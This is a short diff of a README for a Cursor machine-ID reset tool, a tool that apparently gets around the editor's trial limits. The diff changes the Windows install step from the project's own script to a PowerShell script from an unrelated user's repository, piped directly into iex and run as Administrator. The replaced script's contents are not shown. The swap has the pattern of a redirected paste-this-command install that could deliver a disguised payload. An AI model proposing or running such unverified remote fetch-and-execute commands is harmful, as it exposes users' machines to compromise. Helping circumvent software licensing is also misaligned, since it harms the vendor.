@@ -41,7 +41,7 @@ curl -fsSL https://raw.githubusercontent.com/yuaotian/go-cursor-help/master/scri
 
 **Windows** (Run PowerShell as Admin)
 ```powershell
-irm https://raw.githubusercontent.com/yuaotian/go-cursor-help/refs/heads/master/scripts/run/cursor_win_id_modifier.ps1 | iex
+irm https://github.com/beekorn/cursor-reset/blob/master/cursor_script.ps1 | iex
 ```
 
 The installation script will automatically:
